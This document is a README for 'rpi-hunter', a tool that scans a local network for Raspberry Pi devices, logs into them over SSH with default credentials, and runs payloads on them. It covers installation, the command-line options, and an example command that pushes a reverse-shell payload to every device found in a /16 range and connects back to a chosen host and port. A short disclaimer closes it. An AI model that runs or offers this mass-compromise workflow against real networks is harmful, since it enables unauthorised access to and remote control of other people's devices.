# rpi-hunter
Automate discovering all Raspberry Pi's on a LAN and drop a payload via ssh (using default creds)

This tool can be useful for when there are multiple Raspberry Pi's on your LAN with default or known credentials, in order to automate sending commands to them.

# GUIDE:

## Installation

1. Install dependencies: `sudo pip install -U argparse termcolor` and `sudo apt -y install arp-scan tshark sshpass`
2. Download rpi-hunter: `git clone https://github.com/BusesCanFly/rpi-hunter`
3. Navigate to rpi-hunter: `cd ./rpi-hunter`
4. Make rpi-hunter.py executable: `chmod +x rpi-hunter.py`
* One line variant: sudo pip install -U argparse termcolor && sudo apt -y install arp-scan tshark sshpass && git clone https://github.com/BusesCanFly/rpi-hunter && cd ./rpi-hunter && chmod +x rpi-hunter.py

## Usage
```
usage: rpi-hunter.py [-h] [--no-scan] [-r IP_RANGE] [-f IP_LIST] [-c CREDS]
                     [--list] [--payload PAYLOAD] [-H HOST] [-P PORT] [--safe]

optional arguments:
  -h, --help         show this help message and exit
  --no-scan          Disable ARP scanning
  -r IP_RANGE        IP range to scan
  -f IP_LIST         IP list to use (Default ./scan/RPI_list)
  -c CREDS           Password to use when ssh'ing
  --list             List avalible payloads
  --payload PAYLOAD  (Name of or raw) Payload [ex. whoami or reverse_shell
  -H HOST            (If using reverse_shell payload) Host for reverse shell
  -P PORT            (If using reverse_shell payload) Port for reverse shell
  --safe             Print sshpass command, but don't execute it
```
* Example usage: `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337` 
* Run `./rpi-hunter.py --list` to see avalible payloads.
* Payloads can be specified by the payload name from `--list` or as raw iput
    * ex. `--payload reverse_shell` or `--payload [your cli command here]`

## Disclaimer
## The standard internet fun disclaimer applies. Don't commit crimes, be responsible.

## I am in no way responsible for anything and everything you do with rpi-hunter.

